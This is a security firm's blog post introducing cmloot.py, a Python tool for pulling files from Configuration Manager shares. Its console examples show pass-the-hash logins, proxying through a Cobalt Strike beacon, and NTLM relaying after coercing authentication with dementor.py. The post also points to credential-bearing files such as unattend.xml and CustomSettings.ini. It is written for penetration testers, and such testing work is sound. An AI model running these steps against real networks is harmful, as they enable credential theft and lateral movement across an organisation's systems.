&lt;p&gt;The newly released &lt;code&gt;cmloot.py&lt;/code&gt; tool allows you to do all the stuff you love
from CMLoot, but with enhanced capabilities, such as relaying and PtH.. and of
course it runs natively on Linux.&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/shelltrail/cmloot&#34;&gt;https://github.com/shelltrail/cmloot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Follow us on Linkedin for more security related information: &lt;a href=&#34;https://www.linkedin.com/company/shelltrail&#34;&gt;https://www.linkedin.com/company/shelltrail&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;background&#34;&gt;Background&lt;/h1&gt;
&lt;p&gt;Configuration Manager is absolutely the new black in terms of security
research as many new techniques and attacks have surfaced lately and showed that
the complex nature of Configuration Manager may become a security risk for
companies. As Configuration Manager runs in most organizations it is well spent
time to learn both how to attack and defend this service.
As an icing on the cake, Configuration Manager usually contains high privileged
accounts or accounts with implicit high privileges, which makes Configuration
Manager a lucrative target for attackers (and pentesters).&lt;/p&gt;
&lt;p&gt;Configuration Manager is a software developed by Microsoft which helps organizations
to automatically deploy operating systems and software. Being tightly integrated
in Active Directory requires the server to store credentials for various services,
some of which have high privileges. Most often the Configuration Manager server will
have the ability to install agents on all Windows machines it manages, which requires
local administrative privileges on each target. This means that a compromise of
Configuration Manager could lead to lateral movement to a multitude of systems.&lt;/p&gt;
&lt;p&gt;Before diving in to the tooling and the extended features, a bigshout out to
Tomas Rzepka who is the inspiration behind this tool with his own
&lt;a href=&#34;https://github.com/1njected/CMLoot/&#34;&gt;CMLoot&lt;/a&gt;,
which have generated multiple domain compromise paths. Cheers!&lt;/p&gt;
&lt;h1 id=&#34;presenting-cmlootpy&#34;&gt;Presenting: cmloot.py&lt;/h1&gt;
&lt;p&gt;Much like Tomas Rzepka&amp;rsquo;s Powershell version, &lt;code&gt;cmloot.py&lt;/code&gt; is built to aid penetration
testers to search and find
sensitive files in Configuration Manager&amp;rsquo;s complex file share structure.
&lt;code&gt;cmloot.py&lt;/code&gt; is written in python and takes advantage of Impacket&amp;rsquo;s&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; SMB protocol
implementation which
enables all practical features gained from the SMB classes such as pass-the-hash,
Kerberos, SOCKS supports and all stunts possible with NTLM-relaying.&lt;/p&gt;
&lt;p&gt;Before being able to test the possibilities of &lt;code&gt;cmloot.py&lt;/code&gt; you need to find a Configuration
Manager server or Configuration Manager Distribution Point which shares the &lt;code&gt;SCCMContentLib$&lt;/code&gt;
folder.
This share is reachable by default with only &lt;code&gt;Domain Users&lt;/code&gt; or &lt;code&gt;Domain Computers&lt;/code&gt;
membership.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pentester-browsing-configuration-manager-shares.png&#34; alt=&#34;sccmcontentlib_share&#34; title=&#34;Picture showing pentester browsing Configuration Manager shares&#34;&gt;&lt;/p&gt;
&lt;p&gt;This share in turn contains three folders, DataLib, FileLib and PkgLib.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;exposed-shares-during-active-directory-security-assessment.png&#34; alt=&#34;shares&#34; title=&#34;Picture showing exposed shares during Active Directory security assessment&#34;&gt;&lt;/p&gt;
&lt;p&gt;The shares combined, creates a complex file structure which is
optimized and scalable for large Configuration Manager
installations with servers deployed world wide.&lt;/p&gt;
&lt;p&gt;The reason for being complex and in turn scalable is that the DataLib folder only stores
&lt;code&gt;.INI&lt;/code&gt;-files which contains hash values for the
real file. The real file can be found in the FileLib where it is stored in a folder named after
the first four characters of the hash value.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;configuration-manager-datalib-files-during-a-penetration-test.png&#34; alt=&#34;datalib&#34; title=&#34;Picture showing datalib files during a penetration test&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;configuration-manager-filelib-files-during-a-penetration-test.png&#34; alt=&#34;filelib&#34; title=&#34;Picture showing filelib files during a penetration test&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;files-manually-downloaded-from-sccm-share-during-pentest.png&#34; alt=&#34;downloaded&#34; title=&#34;Picture showing files manually downloaded from SCCM share during pentest&#34;&gt;&lt;/p&gt;
&lt;p&gt;If you are attempting to search and download multiple files this becomes tedious work.
&lt;code&gt;cmloot.py&lt;/code&gt; automates this by building an inventory of all files stored in the
DataLib share, which is then used as a reference for the files that can be downloaded.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootinventory sccmfiles.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Access to SCCMContentLib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] sccmfiles.txt created
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;user@adpen1:~/cmloot$ cat sccmfiles.txt 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\cmi2migxml.dll
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\Config_AppsAndSettings.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\Config_AppsOnly.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\Config_SettingsOnly.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\csiagent.dll
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[...]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next up you specify the file extensions of the files that should be downloaded.
By default this is &lt;code&gt;.INI&lt;/code&gt;, &lt;code&gt;.XML&lt;/code&gt; and &lt;code&gt;.CONFIG&lt;/code&gt;. The downloaded files will be
stored in a folder called &lt;code&gt;CMLootOut&lt;/code&gt; if nothing else is specified..&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Extensions to download [&amp;#39;XML&amp;#39;, &amp;#39;INI&amp;#39;, &amp;#39;CONFIG&amp;#39;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Creating CMLootOut
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded D204-Config_AppsAndSettings.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 32AF-Config_AppsOnly.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded B852-Config_SettingsOnly.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded C7F4-MigApp.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded CF90-MigDocs.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded E67A-MigUser.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded F906-ep_defaultpolicy.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;user@adpen1:~/cmloot$ ls CMLootOut/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;32AF-Config_AppsOnly.xml      D204-Config_AppsAndSettings.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B852-Config_SettingsOnly.xml  E67A-MigUser.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C7F4-MigApp.xml               F906-ep_defaultpolicy.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CF90-MigDocs.xml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Files that commonly appear on a Configuration Manager server that will help
you carve your way to Domain Admin is &lt;code&gt;unattend.xml&lt;/code&gt; and &lt;code&gt;CustomSettings.ini&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;unattend.xml&lt;/code&gt; usually stores the domain-join account username and password where
the highlighted risks with the exposure of this account can be read in this article:
&lt;a href=&#34;https://viksafe.com/post/2022/12/19/active-directory-domain-ownjoin-accounts/&#34;&gt;Active Directory domain (own)join accounts&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CustomSettings.ini&lt;/code&gt; can be used much as the &lt;code&gt;unattend.xml&lt;/code&gt; for domain join actions with the fun
addition that the username and password will be stored in the key &lt;code&gt;DomainAdmin=&lt;/code&gt; and &lt;code&gt;DomainAdminPassword=&lt;/code&gt;
(Do not get to excited by the naming, you should be lucky/unlucky if you gain Domain Admin
credentials from this file depending on what side of the attack you are.)&lt;/p&gt;
&lt;p&gt;While these features are in line with the previously released tool for powershell,
&lt;code&gt;cmloot.py&lt;/code&gt; adds some interesting new features to further extend the exploitability
of Configuration Manager. Let&amp;rsquo;s have a look at these in the following examples.&lt;/p&gt;
&lt;h1 id=&#34;examples&#34;&gt;Examples&lt;/h1&gt;
&lt;p&gt;Pass-the-hash with a user account:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB -hashes 0:981f69b7d59d4cc73d1ee05b98981e9c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Extensions to download [&amp;#39;CAB&amp;#39;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 1A6D-ccmsetup.cab
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Pass-the-hash computer account:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ python3 cmloot.py test.local/DEMOMACHINE\$@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB -hashes 0:de22a35159cdf85a91db9a67d08f383a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Extensions to download [&amp;#39;CAB&amp;#39;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 1A6D-ccmsetup.cab
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Could you use it with proxychains and a Cobalt Strike SOCKS5 beacon? I&amp;rsquo;m glad you asked&amp;hellip;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ proxychains python3 cmloot.py TEST.LOCAL/TEST-LOWPRIV@sccm01 -n -cmlootdownload sccmfiles.txt -extensions CAB
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ProxyChains-3.1 (http://proxychains.sf.net)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-100.64.5.221:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Extensions to download [&amp;#39;CAB&amp;#39;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 1A6D-ccmsetup.cab
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With NTLM-relaying? Of course!&lt;/p&gt;
&lt;p&gt;Start a &lt;code&gt;ntlmrelay.py&lt;/code&gt; instance:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ ntlmrelayx.py -socks -t 100.64.5.221 -smb2support --no-http-server --no-wcf-server --no-raw-server  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[*] Servers started, waiting for connections
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Type help for list of commands
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ntlmrelayx&amp;gt;  * Serving Flask app &amp;#39;impacket.examples.ntlmrelayx.servers.socksserver&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; * Debug mode: off
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Trigger SMB interaction for example with MS-RPRN FindFirstRprinter
via &lt;code&gt;dementor.py&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/tools$ python3 dementor.py 100.64.5.25 DEMOMACHINE -u test-lowpriv -p Spettekaka1 -d test.local
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] connecting to DEMOMACHINE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] bound to spoolss
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] getting context handle...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] sending RFFPCNEX...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] done!
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;SOCKS sessions is now available from &lt;code&gt;ntlmrelayx.py&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ntlmrelayx&amp;gt; finished_attacks
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb://TEST\DEMOMACHINE$@100.64.5.221
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run &lt;code&gt;cmloot.py&lt;/code&gt; trough proxychains relaying through &lt;code&gt;ntlmrelayx.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ proxychains python3 cmloot.py TEST/DEMOMACHINE\$@100.64.5.221 -n -cmlootdownload sccmfiles.txt -extensions CAB
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ProxyChains-3.1 (http://proxychains.sf.net)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-100.64.5.221:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Extensions to download [&amp;#39;CAB&amp;#39;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 1A6D-ccmsetup.cab
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;By porting the PowerShell version of &lt;code&gt;CMLoot&lt;/code&gt; to &lt;code&gt;cmloot.py&lt;/code&gt;, pentesters and
assessors will have a more versitile tool in their arsenal which can be used
to assess Configuration Manager from more angles and in turn help organizations
to build up their reciliance against external threats.&lt;/p&gt;
&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/fortra/impacket&#34;&gt;https://github.com/fortra/impacket&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
</description>
    </item>
    
  </channel>
</rss>
